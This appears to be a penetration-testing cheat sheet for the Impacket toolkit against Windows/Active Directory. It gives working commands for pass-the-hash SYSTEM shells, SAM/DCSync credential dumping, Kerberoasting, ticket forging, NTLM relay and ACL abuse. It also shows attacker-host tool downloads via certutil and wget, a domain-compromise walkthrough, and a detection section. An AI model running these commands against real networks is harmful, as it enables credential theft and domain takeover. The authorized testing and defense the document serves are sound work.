# Impacket Toolkit — Escalation & Delivery

[Impacket](https://github.com/fortra/impacket) is a set of Python classes + example scripts implementing Windows network protocols (SMB, MSRPC, Kerberos, LDAP). It runs **from your attack box** (Linux, or Windows with Python) and targets **Windows/AD** services over the network. Authorized engagements only — see [AD Attacks Overview](AD%20Attacks%20Overview.md).

> **Windows vs Linux scope.** Impacket escalates on **Windows/AD**: local-admin → SYSTEM (exec tools) and domain-user → Domain Admin (credential/Kerberos/relay tools). It is **not** a local **Linux privesc** tool — for a Linux *target* use the vectors in [Enumeration & Privilege Escalation](../Linux/Enumeration%20%26%20Privilege%20Escalation.md) (GTFOBins, SUID, sudo, capabilities). Impacket only touches Linux as the *attacker* platform, or when a Linux box is domain-joined and you reuse AD creds against it.

## Naming: `Example.py` vs `impacket-example`

The scripts have two names depending on install. Kali's package prefixes them:

| From `examples/` (pip/git) | On Kali (package) |
| --- | --- |
| `secretsdump.py` | `impacket-secretsdump` |
| `psexec.py` / `wmiexec.py` | `impacket-psexec` / `impacket-wmiexec` |
| `GetUserSPNs.py` | `impacket-GetUserSPNs` |
| `ntlmrelayx.py` | `impacket-ntlmrelayx` |
| `lookupsid.py` / `smbclient.py` | `impacket-lookupsid` / `impacket-smbclient` |
| `getTGT.py` / `getST.py` | `impacket-getTGT` / `impacket-getST` |

Examples below use the `.py` form; swap to `impacket-*` on Kali.

## Where you run these: Linux attack box vs Windows foothold

Separate from the *target* scope above, mind **where the command runs from**:

- **Linux / Kali attack box (the usual):** run the Impacket `.py` scripts over the network. Nothing lands on the target for enumeration/credential tools; exec tools touch the target. This is the default assumed throughout this note.
- **Windows foothold (a shell on a compromised Windows host):** you usually **won't** ship Python + Impacket onto the box. Reach for the **native equivalents** instead — `Rubeus` (Kerberos), `PowerView` (LDAP/ACL enum + edits), `PowerMad` (machine accounts), and built-ins (`net`, `reg`, `sc`, `dir \\host\share`). Each tool group in Step 4 lists the Windows-side counterpart.
- **Ticket format gotcha:** Linux/Impacket use **ccache** files via `$KRB5CCNAME`; Windows tools use **`.kirbi`**. `ticketConverter.py` bridges them (see Step 4C) — the key step when carrying a stolen ticket across platforms.

## Target spec: `[[domain/]user[:pass]@]<target>` — IP or name

Every script takes the target the same way; `<target>` is **an IP or a hostname/FQDN**, and the same NTLM-vs-Kerberos rule applies as for the shell tools:

```bash
# NTLM (password or -hashes) — a raw IP is fine
psexec.py corp.local/Administrator:'Passw0rd!'@10.10.10.5
secretsdump.py corp.local/Administrator@10.10.10.5 -hashes :<nt-hash>

# Kerberos (-k -no-pass, ticket in $KRB5CCNAME) — authenticate to the NAME, not the IP
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local -dc-ip 10.10.10.10

# Reach the service by IP but still authenticate to its Kerberos name
psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local -target-ip 10.10.10.5 -dc-ip 10.10.10.10
```

- `-dc-ip <ip>` — where to find the KDC when DNS won't resolve the domain (if omitted, the domain part of the target must be an FQDN).
- `-target-ip <ip>` — connect to this IP while using the FQDN for the Kerberos SPN.
- The `domain/` in front is the **credential's** AD domain, separate from the target host.

## Step 1 — Deliver Impacket to your attack box (setup)

```bash
# Recommended: isolated install
pipx install impacket

# Or from source (latest)
git clone https://github.com/fortra/impacket
cd impacket && pipx install .

# Verify
secretsdump.py -h
```

## Step 2 — Deliver tools to a target (file transfer)

When you need a tool/binary (e.g. winPEAS, a checker) *on* a compromised host, host it from the attack box and pull it down. `impacket-smbserver` is itself the classic delivery channel.

```bash
# Attacker: serve the current directory over SMB
impacket-smbserver share ./ -smb2support -user u -password p
```

```powershell
# Windows target: pull the file
copy \\<attacker-ip>\share\winPEAS.exe C:\Windows\Temp\winPEAS.exe
```

```bash
# Alt over HTTP — attacker serves, target pulls
python3 -m http.server 80                                           # attacker
certutil -urlcache -f http://<attacker-ip>/winPEAS.exe out.exe      # Windows target
wget http://<attacker-ip>/linpeas.sh -O /tmp/linpeas.sh             # Linux target
```

## Step 3 — Escalation tools (grouped by what they get you)

### A. Local admin → SYSTEM (remote exec)

Authenticate as a **local admin** (password or NT hash) and these drop you to `NT AUTHORITY\SYSTEM`.

```bash
# Interactive SYSTEM shell over SMB (creates a service — noisy)
psexec.py <domain>/<admin>@<target>

# Pass-the-hash (no plaintext needed)
psexec.py -hashes :<nt-hash> <domain>/<admin>@<target>

# Semi-interactive, no service installed (quieter)
wmiexec.py <domain>/<admin>@<target>

# Fallbacks when SMB/WMI are blocked
atexec.py <domain>/<admin>@<target> "whoami"   # scheduled task
dcomexec.py <domain>/<admin>@<target>          # DCOM
```

### B. Domain user → Domain Admin (credential access)

```bash
# Dump local SAM + LSA secrets (needs local admin on the target)
secretsdump.py <domain>/<admin>@<target>

# DCSync a single account, e.g. krbtgt (needs replication rights) -> golden-ticket material
secretsdump.py <domain>/<user>:<pass>@<dc> -just-dc-user krbtgt

# Dump the entire directory from a DC (every domain hash) -> full compromise, report it
secretsdump.py <domain>/<user>:<pass>@<dc> -just-dc
```

### C. Kerberos-based escalation

```bash
# Kerberoast: crack a service account (often privileged) -> its rights
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc> -request -outputfile kerb.hashes
hashcat -m 13100 kerb.hashes wordlist.txt

# AS-REP roast: users without Kerberos pre-auth
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc> -no-pass -format hashcat -outputfile asrep.hashes

# S4U / constrained delegation: impersonate a privileged user to a service
getST.py -spn cifs/<target> -impersonate Administrator <domain>/<svc-acct>:<pass>

# Forge tickets (golden/silver) once you hold krbtgt / a service hash — domain dominance, report
ticketer.py -nthash <krbtgt-hash> -domain-sid <sid> -domain <domain> Administrator
```

See [Kerberos Attacks](Kerberos%20Attacks.md) for the theory behind these.

### D. NTLM relay (escalate without cracking)

Relay captured NTLM auth to a host where the victim is admin, or to LDAP to grant yourself delegation. Pair with Responder / mitm6 to capture the auth. High impact — **get explicit scope**.

```bash
# Relay to hosts in a list; dump SAM where the victim is local admin
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to LDAP to configure RBCD on a computer object -> impersonate to it
ntlmrelayx.py -t ldap://<dc> --delegate-access
```

## Step 4 — More Impacket tools, with Windows-native equivalents

The Step 3 tools escalate; these round out enumeration, file/host management, ticket handling, and modern ACL/delegation abuse. Each group shows the **Linux (Impacket, from your attack box)** command and the **Windows (on a foothold)** equivalent, per the platform note above.

### A. Enumeration (domain creds, no admin needed)

```bash
# Linux — Impacket, over the network
lookupsid.py <domain>/<user>:<pass>@<dc>                 # RID-cycle: enumerate users/groups by SID
GetADUsers.py -all <domain>/<user>:<pass> -dc-ip <dc>    # list users + pwdLastSet / lastLogon
samrdump.py <domain>/<user>:<pass>@<target>              # users, groups, shares via SAMR/MSRPC
findDelegation.py <domain>/<user>:<pass> -dc-ip <dc>     # accounts trusted for delegation
rpcdump.py @<target>                                     # RPC endpoints -> spot PrinterBug/PetitPotam coercion
```

```powershell
# Windows foothold — built-ins + PowerView (no Python needed)
net user /domain ; net group "Domain Admins" /domain     # built-in
Get-DomainUser -TrustedToAuth                            # PowerView — delegation
Get-DomainComputer ; Get-DomainController                # PowerView — hosts / DCs
```

### B. SMB files & remote host management

```bash
# Linux — Impacket
smbclient.py <domain>/<user>:<pass>@<target>             # interactive SMB: ls / get / put on shares
reg.py <domain>/<admin>@<target> query -keyName 'HKLM\\SOFTWARE'   # remote registry (needs admin)
services.py <domain>/<admin>@<target> list               # enumerate / start / stop services
```

```powershell
# Windows foothold — already-present built-ins
net use \\<target>\C$ ; dir \\<target>\C$                # SMB share access
reg query \\<target>\HKLM\SOFTWARE                       # remote registry
sc.exe \\<target> query                                  # services
```

### C. Kerberos ticket handling (watch the format)

Linux/Impacket read tickets from **ccache** via `$KRB5CCNAME`; Windows tools use **`.kirbi`**. Convert with `ticketConverter.py` when moving a ticket between the two.

```bash
# Linux — Impacket
getTGT.py <domain>/<user>:<pass>                         # request TGT -> user.ccache
export KRB5CCNAME=user.ccache                            # then use any -k tool: wmiexec.py -k -no-pass <target>
describeTicket.py user.ccache                            # inspect a ticket
ticketConverter.py rubeus.kirbi out.ccache               # .kirbi (Windows) -> ccache (Linux)
```

```powershell
# Windows foothold — Rubeus, in memory
Rubeus.exe asktgt /user:<user> /rc4:<nt-hash> /ptt       # TGT + inject (overpass-the-hash)
Rubeus.exe describe /ticket:<base64-or-.kirbi>           # inspect
```

### D. Account & ACL manipulation (modern AD privesc)

Needs a write right somewhere (from BloodHound): machine-account quota, `GenericAll`/`WriteDACL`, `ForceChangePassword`, etc.

```bash
# Linux — Impacket
addcomputer.py <domain>/<user>:<pass> -computer-name 'EVIL$' -computer-pass 'P@ssw0rd'   # add machine acct (RBCD / noPac)
rbcd.py -delegate-from 'EVIL$' -delegate-to '<victim>$' -action write <domain>/<user>:<pass>
dacledit.py -action write -rights FullControl -principal <user> -target <victim> <domain>/<user>:<pass>
owneredit.py -action write -owner <user> -target <victim> <domain>/<user>:<pass>
changepasswd.py <domain>/<victim>@<dc> -newpass 'NewP@ss1'    # abuse ForceChangePassword / expired creds
```

```powershell
# Windows foothold — PowerMad + PowerView
New-MachineAccount -MachineAccount EVIL -Password (ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force)  # PowerMad
Set-DomainRBCD -Identity <victim> -DelegateFrom 'EVIL$'      # PowerView
Add-DomainObjectAcl -TargetIdentity <victim> -PrincipalIdentity <user> -Rights All   # PowerView
Set-DomainUserPassword -Identity <victim> -AccountPassword $p # PowerView
```

## Putting it together — end-to-end delivery walkthrough

1. **Set up** Impacket on the attack box (Step 1).
2. **Get initial domain creds** from [Enumeration](Enumeration.md) (spray, capture, or provided).
3. **Find where you're local admin:** `nxc smb <subnet> -u <user> -p <pass>`.
4. **`secretsdump.py`** that host → collect more NT hashes / local-admin creds.
5. **`psexec.py` / `wmiexec.py`** with a privileged hash → **SYSTEM** on the next host.
6. **`secretsdump.py -just-dc`** against the DC (once you have DA/replication) → **domain compromise**.
7. **Document** every hop — command, host, timestamp, result — for the report.

## Defense / detection

- **secretsdump / DCSync:** alert on directory replication (event **4662** with replication GUIDs) from non-DC accounts; restrict `Replicating Directory Changes`.
- **psexec / smbexec:** service creation (**7045**), writes to `ADMIN$`; wmiexec/atexec leave WMI/Task Scheduler traces.
- **Kerberoast / AS-REP:** **4769** RC4 spikes, **4768** with pre-auth=0; use gMSA + AES.
- **NTLM relay:** enforce **SMB signing** and **LDAP channel binding/signing**, disable NTLM where possible, patch coercion (PetitPotam/PrinterBug), EDR on `mitm6`.
- **Enumeration (lookupsid / samrdump):** RID cycling shows as a burst of SAMR lookups / **4661** object-access on the DC; restrict anonymous/authenticated enumeration where feasible.
- **Machine account + RBCD (addcomputer / rbcd):** set `ms-DS-MachineAccountQuota` to 0, alert on computer-account creation (**4741**) and `msDS-AllowedToActOnBehalfOfOtherIdentity` writes.
- **ACL edits (dacledit / owneredit):** directory object modification (**5136**) on high-value objects; review DACL/owner changes.
- **reg / services / smbclient:** remote registry and service ops over SMB — same **7045** / `ADMIN$` and named-pipe traces as the exec tools.
